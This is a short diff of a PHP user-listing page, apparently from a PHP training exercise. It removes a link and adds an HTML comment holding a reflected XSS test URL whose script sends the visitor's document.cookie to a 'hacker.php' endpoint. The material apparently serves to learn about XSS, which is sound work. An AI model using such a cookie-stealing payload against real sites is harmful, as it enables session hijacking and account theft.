@@ -62,5 +62,6 @@ if(!empty($_GET['keyword'])) {
         </div>
         <?php } ?>
     </div>
-    <a href="#" id="autoFillLink">Nhập dữ liệu</a>
 
+    <!-- http://localhost:8080/training-php1/list_users.php?keyword=
+<script>x = new Image; x.src = "http://localhost:8080/training-php/configs/hacker.php?cookie="+document.cookie</script> -->
